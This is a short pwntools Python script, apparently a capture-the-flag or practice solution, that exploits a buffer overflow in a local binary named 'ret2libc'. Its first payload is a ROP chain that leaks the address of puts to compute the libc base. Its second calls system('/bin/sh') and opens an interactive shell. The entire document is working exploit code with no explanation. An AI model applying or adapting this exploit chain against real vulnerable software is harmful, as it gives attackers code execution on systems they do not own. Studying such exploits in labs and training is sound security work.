from pwn import *

p = process('./ret2libc')
elf = ELF('./ret2libc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

junk = b'a' * 56
putsPLT = elf.plt['puts']
putsGOT = elf.got['puts']
getsPLT = elf.plt['gets']
bss = 0x00602000 - 0x100
pop_rdi = 0x0000000000400733
ret = 0x0000000000400506
main = elf.symbols['main']
putsOffset = libc.symbols['puts']
systemOffset = libc.symbols['system']

payload = junk + p64(pop_rdi) + p64(putsGOT) + p64(putsPLT) + p64(main)
p.sendlineafter(':D', payload)

p.recv()
baseAddr = u64(p.recvline().strip().ljust(8, b'\x00')) - putsOffset
print(hex(baseAddr))
system = baseAddr + systemOffset
sh = next(libc.search(b'/bin/sh')) + baseAddr
payload = junk + p64(ret) + p64(pop_rdi) + p64(sh) + p64(system)
p.sendlineafter(':D', payload)

p.interactive()